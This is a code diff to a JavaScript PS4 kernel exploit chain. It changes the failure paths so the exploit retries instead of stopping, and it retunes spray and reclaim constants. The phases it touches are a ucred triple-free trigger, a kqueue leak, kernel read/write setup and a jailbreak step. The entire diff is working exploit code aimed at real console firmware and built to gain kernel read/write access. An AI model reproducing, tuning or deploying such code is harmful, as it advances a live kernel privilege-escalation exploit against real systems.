@@ -1050,8 +1050,10 @@ function exploit_phase_trigger() {
   if (exploit_end) return;
 
   if (exploit_count >= MAIN_LOOP_ITERATIONS) {
-    log('Failed to acquire kernel R/W');
-    exploit_end = true;
+    log('Failed to acquire kernel R/W - Retrying exploit.');
+    cleanup();
+    sched_yield(); 
+    yield_to_render(exploit_phase_trigger);
     return;
   }
 
@@ -1059,10 +1061,10 @@ function exploit_phase_trigger() {
   log('Triggering... (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')');
 
   if (!trigger_ucred_triplefree()) {
-    log('Triplefree failed — exploit stopped.');
+    log('Triplefree failed — Retrying exploit.');
     cleanup();
-    sched_yield();   // تهوية بعد الكلين
-    exploit_end = true;
+    sched_yield();
+    yield_to_render(exploit_phase_trigger);
     return;
   }
 
@@ -1073,10 +1075,10 @@ function exploit_phase_leak() {
   if (exploit_end) return;
 
   if (!leak_kqueue_safe()) {
-    log('Leak failed — exploit stopped.');
+    log('Leak failed — Retrying exploit.');
     cleanup();
     sched_yield();
-    exploit_end = true;
+    yield_to_render(exploit_phase_trigger);
     return;
   }
 
@@ -1093,7 +1095,7 @@ function exploit_phase_rw() {
     log('R/W setup failed — please reboot your PS4.');
     cleanup();
     sched_yield();
-    exploit_end = true;
+    yield_to_render(exploit_phase_trigger);
     return;
   }
 
@@ -1109,8 +1111,7 @@ function exploit_phase_jailbreak() {
 
   jailbreak();
   cleanup();
-  exploit_end = true;
-
+  sched_yield();
   log('Jailbreak completed successfully');
 }
 function safe_fhold_fd(fd, label) {
@@ -1662,7 +1663,7 @@ function leak_kqueue() {
   var magic_val = new BigInt(0x0, 0x1430000);
   var magic_add = leak_rthdr.add(0x08);
   var count = 0;
-  var MAX_KQ = 5000;
+  var MAX_KQ = 7000;
 
   while (count < MAX_KQ) {
     count++;
@@ -1768,15 +1769,15 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
 // =========================
 
 // UIO reclaim max loops
-var KREAD_MAX_UIO_RECLAIM  = 2000;
-var KWRITE_MAX_UIO_RECLAIM = 2000;
+var KREAD_MAX_UIO_RECLAIM  = 1500;
+var KWRITE_MAX_UIO_RECLAIM = 1500;
 
 // IOV reclaim max loops
-var KREAD_MAX_IOV_RECLAIM  = 200;
-var KWRITE_MAX_IOV_RECLAIM = 200;
+var KREAD_MAX_IOV_RECLAIM  = 250;
+var KWRITE_MAX_IOV_RECLAIM = 250;
 
 // Memory exhaustion threshold
-var MEMORY_ZERO_THRESHOLD = 4;
+var MEMORY_ZERO_THRESHOLD = 3;
 
 // Offsets inside leak_rthdr
 var UIO_LEAK_OFFSET = 0x08;
